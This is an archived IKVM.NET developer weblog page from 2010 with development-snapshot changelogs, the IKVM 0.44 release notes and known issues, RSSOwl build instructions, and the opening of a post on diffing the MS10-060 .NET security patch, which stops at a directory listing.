		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=53f694f0-fdd2-44c2-bafe-8fb09ace3d19"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=53f694f0-fdd2-44c2-bafe-8fb09ace3d19">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 15 October 2010</h2></div>
<div class="newsItems"><a name="a46a2a30e-8c8d-4881-9e12-0eb54862da2a"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for a new snapshot. No major theme this time, but lots of bug fixes and some new infrastructure for doing more MSIL optimizations. Volker added the Nimbus L&amp;F.</P>
<P>Changes:</P>
<UL>
<LI>Moved local variable analysis from verifier into a separate pass.</LI>
<LI>Restructured method analyzer/verifier to make data flow more obvious and keep less data alive during compilation.</LI>
<LI>Various minor refactorings and clean up.</LI>
<LI>Changed workaround for gmcs inability to properly deal with two-pass compilation of mutually dependant assemblies to use reflection, because the previous workaround now also fails on Mono 2.8.</LI>
<LI>Fixed reflection method invocation issue: Always wrap InvocationTargetException in another InvocationTargetException, to handle the case where a method is recursively calling itself.</LI>
<LI>Added support for boolean, byte, char and short non-final static field constant attributes.</LI>
<LI>Implemented create() for ButtonPeer and LabelPeer.</LI>
<LI>Implemented first stab at converting suitable fault blocks into finally blocks.</LI>
<LI>Changed CodeEmitter to build intermediate store of MSIL code to allow post-processing optimization steps.</LI>
<LI>Added endfinally opcode support to xml remapper.</LI>
<LI>Changed xml remapper to require explicit exits in exception blocks.</LI>
<LI>Moved ikvmc core assembly detection to the right place, to avoid problems when a non-main assembly of the core assembly set is explicitly referenced.</LI>
<LI>Fix to make sure that ikvmc (and ikvmstub) can find assemblies that are part of a multi assembly (shared class loader) group (if the assembly is in the same directory as the main assembly of the group).</LI>
<LI>Fix a rounding problem with FontMetrics.</LI>
<LI>Implemented createCompatibleVolatileImage() for Nimbus.</LI>
<LI>Implemented Graphics.setPaint() with a LinearGradientPaint for Nimbus.</LI>
<LI>Added Nimbus L&amp;F.</LI>
<LI>Fixed threading problem in font metrics code.</LI>
<LI>Fixed regression in stack trace printing of .NET (not remapped) exceptions introduced in 0.44. The .NET stack trace should not be included in the message.</LI>
<LI>Fixed ikvmc bug. Before saving any of the output assemblies, we should first finish all of them (because InternalsVisibleToAttributes may be added as a side effect of compiling code in another assembly).</LI>
<LI>Fixed regression in SocketInputStream.read(). The offset into the byte array was ignored.</LI>
<LI>Use renderings hints of FontMetrics for drawGlyphVector.</LI>
<LI>Fixed regression introduced with fault handlers. Exception handlers inside fault handlers could be ignored.</LI>
<LI>Added some experimental MSIL optimizations to CodeEmitter. They can be enabled by setting the IKVM_EXPERIMENTAL_OPTIMIZATIONS environment variable.</LI>
<LI>Added error handling for -remap file errors to ikvmc.</LI>
<LI>IKVM.Reflection: Fixed ILGenerator to throw a NotSupportException if a branch offset doesn't fit (i.e. when a short form branch is used inappropriately).</LI>
<LI>IKVM.Reflection: Added exception message for backward branch constraints violations.</LI>
<LI>IKVM.Reflection: Fixed ILGenerator to properly sort exception table when running on Mono.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.3940.zip">ikvmbin-0.45.3940.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/15/2010 06:32:16 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=46a2a30e-8c8d-4881-9e12-0eb54862da2a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=46a2a30e-8c8d-4881-9e12-0eb54862da2a">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 10 September 2010</h2></div>
<div class="newsItems"><a name="a1986f244-dcc8-4a49-a4ae-a1454525473a"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've started on IPv6 support. The classic socket APIs (i.e. the java.net package) now supports IPv6. At the moment it is .NET only, because Mono on Windows doesn't appear to support IPv6 and on Linux you apparently cannot bind both an IPv4 and IPv6 socket to the same port at the same time (suggestions on this are welcome).</P>
<P>The implementation is based on a relatively straightforward port of the OpenJDK files TwoStacksPlainDatagramSocketImpl.c and TwoStacksPlainSocketImpl.c to Java. I wrote a Java Winsock API wrapper on top of the .NET Socket API (which in turn is a wrapper on the actual Winsock API). In the future the OpenJDK DualStack code should also be ported, for use on Vista/Win7 and probably Linux.</P>
<P>What remains to be done is update the nio socket code to support IPv6.</P>
<P>Changes:</P>
<UL>
<LI>Added some missing resources to IKVM.OpenJDK.Tools.dll.</LI>
<LI>Removed x64 JIT bug workaround that triggered <A href="http://connect.microsoft.com/VisualStudio/feedback/details/578948/x64-jit-stack-overflow">another x64 bug</A>.</LI>
<LI>Implemented IPv6 support (.NET only) for java.net package APIs.</LI>
<LI>Several fixes/improvements to <A href="http://download-llnw.oracle.com/javase/6/docs/api/java/net/NetworkInterface.html">java.net.NetworkInterface</A>.</LI>
<LI>Implemented Graphics.drawImage() with AffineTransform.</LI>
<LI>Improved StandardGlyphVector.</LI>
<LI>FontMetrics fixes.</LI>
<LI>Inet[4|6]AddressImpl.lookupAllHostAddr() should throw UnknownHostException instead of returning an empty array.</LI>
<LI>Don't expose IPv6 network interface addresses when IPv6 isn't enabled.</LI>
<LI>Added workaround for <A href="https://bugzilla.novell.com/show_bug.cgi?id=622524">Mono TimeZoneInfo bug</A>.</LI>
<LI>Fix build on Linux.</LI>
<LI>Fixed java.lang.Thread to synchronize on private lock instead of Thread object in thread startup code, to avoid potential deadlock with user code.</LI>
<LI>Added check to make sure that vfs.zip exists, before building second pass version of IKVM.Runtime.dll, because it appears that mcs doesn't complain about missing resources.</LI>
<LI>Fixed bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;aid=3056721&amp;group_id=69637&amp;atid=525264">3056721</A>.</LI>
<LI>Added explanatory message to Link Error if it is caused by a missing reference.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.3905.zip">ikvmbin-0.45.3905.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/10/2010 11:44:21 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1986f244-dcc8-4a49-a4ae-a1454525473a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1986f244-dcc8-4a49-a4ae-a1454525473a">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 09 September 2010</h2></div>
<div class="newsItems"><a name="a38a2599a-89ed-4ad1-ab51-74e75925d213"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.44 Released</h3>
	<div class="entryBody">
		I've <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">released IKVM 0.44</A> to SourceForge. The binaries are identical to the ones in <A HREF="/PermaLink.aspx?guid=98e652b2-d825-4270-8ad6-90c11b21933c">release candidate 5</A>.
<P><B>Release Notes</B></P>
<P>This document lists the known issues and incompatibilities.</P>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. </LI>
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. </LI>
<LI>JNI<BR>&nbsp;
<UL>
<LI>Only supported in the default AppDomain. </LI>
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). </LI>
<LI>Cannot call string contructors on already existing string instances </LI>
<LI>A few limitations in Invocation API support<BR>&nbsp;
<UL>
<LI>The Invocation API is only supported when running on .NET. </LI>
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. </LI>
<LI>JNI_GetDefaultJavaVMInitArgs not implemented </LI>
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. </LI>
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). </LI>
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL></LI>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL></LI>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. </LI>
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. </LI>
<LI>Floating point is not fully spec compliant. </LI>
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). </LI>
<LI>Synchronized blocks are not async exception safe. </LI>
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. </LI>
<LI>Class loading is more eager than on the reference VM. </LI>
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). </LI>
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. </LI>
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). </LI>
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). </LI>
<LI>Only code compiled in a single assembly fully obeys the JLS binary compatibility rules. </LI>
<LI>An assembly can only contain one resource with a particular name. </LI>
<LI>Passing incorrect command line options to ikvmc may result in an exception rather than a proper error messages.</LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 6 build 18. Below is a list of divergences and IKVM specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>GNU Classpath implementation. Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>Partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.net</TD>
<TD>No IPv6 support implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.text.Bidi</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Partial implementation. JPEGs can be read and written, but there is no metadata support.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Implementation based on .NET ODBC managed provider.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Image content handlers not implemented.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.print, for example, means that the API is there but there is no back-end to provide the actual printing support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). </LI>
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). </LI>
<LI>java.lang.String.intern() strings are never garbage collected. </LI>
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. </LI>
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. </LI>
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). </LI>
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. </LI>
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. </LI>
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x64</TD>
<TD>Windows</TD></TR></TBODY></TABLE>
<P><BR><B>Partial Trust</B></P>
<P>There is experimental support for running in partial trust.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/09/2010 10:48:31 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=38a2599a-89ed-4ad1-ab51-74e75925d213"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=38a2599a-89ed-4ad1-ab51-74e75925d213">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 25 August 2010</h2></div>
<div class="newsItems"><a name="a6c8de1ef-18dc-4c97-a4ff-4cffe52fce52"></a><div class="entry">
	<h3 class="entryTitle">Running RSSOwl on IKVM.NET</h3>
	<div class="entryBody">
		<P>I recently upgraded my RSS reader from the older version I was still using to the current version. That turned out to be a mistake. The new version was even more broken than the old version, so I decided it was time to switch. I remembered <A href="http://www.rssowl.org/">RSSOwl</A> from <A href="http://lists.gnu.org/archive/html/classpath/2005-03/msg00149.html">several years ago</A> when I tested it on IKVM (it uses the Eclipse <A href="http://en.wikipedia.org/wiki/Standard_Widget_Toolkit">Standard Widget Toolkit</A>, so like Eclipse it was a good test app back when AWT support was completely useless).</P>
<P>I downloaded the most recent version and played with it and it appeared to suit my needs. Of course, after I decided that I was going to start using it, I wanted to run it on IKVM and not in dynamic mode, but compiled with ikvmc. Fortunately, RSSOwl uses OSGi in much the same way as Eclipse, so I was able to reuse the work I did to get Eclipse to compile with ikvmc.</P>
<P>To play along at home, follow these instructions (on Windows):</P>
<UL>
<LI>Download <A href="http://downloads.sourceforge.net/rssowl/rssowl-2.0.5.win32.zip">rssowl-2.0.5.win32.zip</A>, <A href="http://www.frijters.net/ikvmbin-0.44.0.5.zip">ikvmbin-0.44.0.5.zip</A> and <A href="http://www.frijters.net/rssowl-clr.zip">rssowl-clr.zip</A> and put them all in the same directory.</LI>
<LI>Open a Command Prompt and go to the directory where you downloaded the zip files.</LI>
<LI>Run these commands:<BR><CODE>unzip rssowl-2.0.5.win32.zip</CODE><BR><CODE>cd rssowl</CODE><BR><CODE>unzip ..\ikvmbin-0.44.0.5.zip</CODE><BR><CODE>unzip ..\rssowl-clr.zip</CODE><BR><CODE>mk</CODE></LI>
<LI>Start RSSOwl by running rssowl-clr.exe</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/25/2010 12:27:23 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6c8de1ef-18dc-4c97-a4ff-4cffe52fce52"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6c8de1ef-18dc-4c97-a4ff-4cffe52fce52">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 24 August 2010</h2></div>
<div class="newsItems"><a name="aac6cfb6a-6138-4c36-895e-636c77242e39"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>While the 0.44 release candidates have been baking, I've been working on 0.45. There are some interesting changes related to resource handling and stub classes.</P>
<P><STRONG>Resources</STRONG></P>
<P>&nbsp;Previously, if you looked at the URL returned by ClassLoader.getResource() for an ikvmc compiled assembly you see something ugly like this:</P>
<P>&nbsp;ikvmres://IKVM.OpenJDK.Jdbc,%20Version=0.44.0.5,%20Culture=neutral,%20PublicKeyToken=13235d27fcbfff58/META-INF/services/java.sql.Driver</P>
<P>Now with 0.45, you see:</P>
<P>jar:file:/C:/.virtual-ikvm-home/assembly/IKVM.OpenJDK.Jdbc__0.45.3887.0__13235d27fcbfff58/resources/resources.jar!/META-INF/services/java.sql.Driver</P>
<P>This is also a bit strange, because C:\.virtual-ikvm-home doesn't actually exist, but it is the IKVM Virtual File System directory that was introduced with the switch to OpenJDK, to facilitate the fact that OpenJDK likes to load lots of files from the installation directory.</P>
<P>Starting with 0.45, the virtual file system is also used to load resources and stub classes. When you compile your jar with ikvmc, the resources in the jar will be copied into a new jar (usually with the same name) and that jar will be attached as a managed resource to the target assembly. This resource is projected into VFS and the normal Java resource loading mechanism is (more or less) used to load resources from the jar.</P>
<P>This has two main advantages. The first is that this makes it more likely that Java code that makes various assumptions about being being able to explicitly open a resource jar, will work. The second is that this method of storing resources, usually results in smaller assemblies.</P>
<P>Another benefit of this change is that I finally fixed the issue with ikvmc skipping resources due to name clashes. Previously there was only a single resource namespace per assembly, but now an assembly can contain multiple resource jars.</P>
<P><STRONG>Stub Classes</STRONG></P>
<P>Some Java code requires .class files for system classes. This is usually because they want to do dynamic code generation and Java's reflection isn't really good enough for that. For a long time IKVM has supported this by dynamically creating the .class files (in a runtime equivalent of ikvmstub) whenever code tried to load a resource that ended with .class and a corresponding type was found. This used the same ikvmres protocol mechanism as normal resources. With this snapshot, the stub classes have also moved to VFS. They are still generated on demand, but they are now accessible via the Java file IO APIs. This means that the sun.boot.class.path property can now point to VFS and that Java code, like javac, that depends on sun.boot.class.path will now work.</P>
<P>You can now build a working javac.exe like this:</P>
<P><CODE>ikvmc -main:com.sun.tools.javac.Main -out:javac.exe -r:IKVM.OpenJDK.Tools.dll</CODE></P>
<P>The resulting javac.exe will be very small (4KB), because all the code is in IKVM.OpenJDK.Tools.dll (the equivalent of tools.jar).</P>
<P>Changes:</P>
<UL>
<LI>Fixed java.util.zip.Inflater to throw exception for corrupt zip files (<A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=36560">http://gcc.gnu.org/bugzilla/show_bug.cgi?id=36560</A>). 
<LI>Added the ability to nest ikvmc response files and added error handling to response file reading. 
<LI>Made most ikvmc warnings local to the target that is being compiled (in multi target mode), to allow warnings to be suppressed (or turned into an error) for a specific target. 
<LI>Added -writeSuppressWarningsFile:<FILE> ikvmc option. 
<LI>Added support for comment lines in ikvmc response files. 
<LI>Volker implemented Window.setMinimumSize(). 
<LI>Massive change to change resource handling. Java resources are now stored in jars that are stored as managed .NET resources. The jars are projected into VFS and the assembly class loaders know how to load resources from these jars. 
<LI>Volker added support for "My Computer" folder. 
<LI>Volker fixed a regression in Toolkit.createImage(ImageProducer). 
<LI>Fixed build to work when Mono isn't installed. 
<LI>Stub classes are now projected into VFS. 
<LI>Stub classes (as resources) are no longer generated if a resource with that name already exists in the assembly. 
<LI>System property "sun.boot.class.path" now points to stub classes in VFS. 
<LI>Removed the requirement to have peverify and ilasm in the PATH. They are now located automatically and if they are not found, the corresponding build steps are skipped. 
<LI>Separated managed and native build steps and made managed the default target. This allows doing a build with "nant" with just nant and JDK 1.6 in the PATH. 
<LI>Changed default build target to automatically generate a CommonAssemblyInfo.cs with todays build number. 
<LI>Fixed java.lang.ref.Reference to not store a strong reference to java.lang.Class objects, if class GC is enabled. Note that class GC is only available on .NET 4.0 and when IKVM is specifically built for .NET 4.0.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.3887.zip">ikvmbin-0.45.3887.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/24/2010 08:32:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ac6cfb6a-6138-4c36-895e-636c77242e39"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ac6cfb6a-6138-4c36-895e-636c77242e39">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 23 August 2010</h2></div>
<div class="newsItems"><a name="a98e652b2-d825-4270-8ad6-90c11b21933c"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.44 Release Candidate 5</h3>
	<div class="entryBody">
		<P>Two more bug fixes and this will hopefully be the final release candidate.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.44.0.5</LI>
<LI>Don't seal @Internal classes.</LI>
<LI>Fixed bug <A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=3046925&amp;group_id=69637&amp;atid=525264">#3046925</A>.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.44.0.5.zip">ikvmbin-0.44.0.5.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.44.0.5.zip">ikvmsrc-0.44.0.5.zip</A>, <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A></P>
<P>The sources zip no longer contains any binaries. </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/23/2010 06:35:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=98e652b2-d825-4270-8ad6-90c11b21933c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=98e652b2-d825-4270-8ad6-90c11b21933c">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 18 August 2010</h2></div>
<div class="newsItems"><a name="a64846e48-801b-44db-87ca-a0a0d2ac4e0e"></a><div class="entry">
	<h3 class="entryTitle">@ikvm.lang.Internal Revisited</h3>
	<div class="entryBody">
		<P>A couple of days ago, Dawid Weiss <A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=3046925&amp;group_id=69637&amp;atid=525264">filed a bug</A> related to @ikvm.lang.Internal and while fixing the bug I realized that the feature has significantly evolved since its introduction, but that was never documented.</P>
<P>I originally <A HREF="/PermaLink.aspx?guid=d4cb2ad2-fa1d-4ac1-83ec-1b222ea88e2e">introduced @ikvm.lang.Internal</A> as a relatively simple workaround for an annoying short coming of Java and mainly for my own convenience in writing the core class libraries, but when I added support <A href="http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.internalsvisibletoattribute.aspx">InternalsVisibleAttribute</A> things became more complex.</P>
<P>The support for InternalsVisibleToAttribute in itself is something that evolved from relatively weak to the current state of mostly working (there is still one known issue, where InternalsVisibleToAttribute annotations won't be recognized during a multi target build, but this isn't very high priority, because in the common cases ikvmc will automatically add (and recognize) the InternalVisibleToAttribute when needed during multi target compilation.)</P>
<P><STRONG>So what does @ikvm.lang.Internal do?</STRONG></P>
<P>It's actually still relatively simple: It marks a type or member as "internal". This means that its Java access modifiers will be ignored (even private members can be marked as internal) and that any other assembly that has access to the assembly's internals will be able to access it (in the case of members, you also need to be able to access to containing type, of course.)</P>
<P>For members this looks a lot like the C# <A href="http://msdn.microsoft.com/en-us/library/7c5ka91b.aspx">internal</A> access modifier, but for types there is a significant difference to be aware of. From Java code in another assembly (that is designated by InternalsVisibleTo) you can only access types that are explicitly marked with @ikvm.lang.Internal, note that this is unlike C# where any non-nested type can be accessed.</P>
<P>At runtime, when you use reflection to inspect a type or member marked with @ikvm.lang.Internal, it will appear as package accessible. When you use reflection to invoke, set or get a member, it will be treated as internal.</P>
<P>I fixed the bug Dawid reported and also fixed the "effectively final" optimization to not mark classes with @ikvm.lang.Internal as final. The fixes will be in the next 0.44 release candidate.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/18/2010 09:19:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=64846e48-801b-44db-87ca-a0a0d2ac4e0e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=64846e48-801b-44db-87ca-a0a0d2ac4e0e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 14 August 2010</h2></div>
<div class="newsItems"><a name="ac1e9440e-becc-41a4-bf2a-12c407f07737"></a><div class="entry">
	<h3 class="entryTitle">Reverse Engineering the MS10-060 .NET Security Patch</h3>
	<div class="entryBody">
		<P>On Patch Tuesday, one of the patches Microsoft released was <A href="http://www.microsoft.com/technet/security/bulletin/ms10-060.mspx">MS10-060</A>. It addresses a Silverlight memory corruption and a CLR delegate issue. I was curious about the CLR delegate issue and decided to see if I could reverse engineer the patch to find the issue. Now, I'm not a professional security researcher or malware developer, so I don't have any good tools to do this. They have binary diffing tools that make it very easy to find the differences between the original file and the patched file. I was stuck with dumpbin /disasm to get the disassembled code for the two versions of the file, but I'm getting ahead of myself.</P>
<P><STRONG>Patch Contents</STRONG></P>
<P>In the <A href="http://support.microsoft.com/kb/983590">KB983590</A> article Microsoft helpfully describes all the files that are changed by the update. Looking through the list it is obvious that there are only two interesting files: mscorwks.dll and mscorlib. After running both the patched and unpatched versions of mscorlib.dll through ildasm it was obvious that there weren't any changes to mscorlib (other than the version number). So I had to focus on the unmanaged code side. I ran the patched and unpatched versions of mscorwks.dll through dumpbin /disasm and looked at the resulting files:</P><PRE>C:\j\ms10-060&gt;dir<BR>
Volume in drive C is 320GB_7200
Volume Serial Number is 0404-135D<BR>
Directory of C:\j\ms10-060<BR>
08/12/2010  08:36    &lt;DIR&gt;          .
08/12/2010  08:36    &lt;DIR&gt;          ..
05/21/2010  00:49         5,816,656 mscorwks-ms10-060.dll
08/12/2010  08:28             5,157 mscorwks-ms10-060.headers
08/12/2010  08:38       <SPAN style="BACKGROUND-COLOR: yellow">118,871,231</SPAN> mscorwks-ms10-060.lst
06/10/2009  23:23         5,816,640 mscorwks-vuln.dll
08/12/2010  08:27             5,153 mscorwks-vuln.headers
08/12/2010  08:35       118,827,088 mscorwks-vuln.lst
               6 File(s)    249,341,925 bytes
